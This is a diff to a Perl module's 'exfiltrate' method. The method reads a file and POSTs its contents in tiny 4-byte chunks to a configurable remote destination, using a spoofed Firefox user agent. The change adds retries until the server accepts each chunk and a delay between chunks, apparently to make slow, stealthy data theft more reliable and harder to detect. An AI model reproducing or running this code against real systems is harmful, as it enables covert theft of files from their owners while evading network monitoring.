@@ -26,20 +26,25 @@ sub setHeader {
 sub exfiltrate {
     my($self, $file) = @_;
     my($data, $n, $res);
+    my $userAgent = new LWP::UserAgent;
+    my $request = new HTTP::Request 'POST' => $self->dest;
 
     $self->SUPER::load($file);
 
-    my $userAgent = new LWP::UserAgent;
     $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');
-
-    my $request = new HTTP::Request 'POST' => $self->dest;
 
     setHeader($request);
 
     while (($n = read $self->file, $data, 4) != 0) {
+        $res = 0;
+
         $request->content('{ "data": ' . $data . ' }');
 
-        $res = $userAgent->request($request);
+        while (!$res || $res->code != 200) {
+            $res = $userAgent->request($request);
+        }
+
+        sleep($self->delay);
     }
 
     $self->SUPER::close();
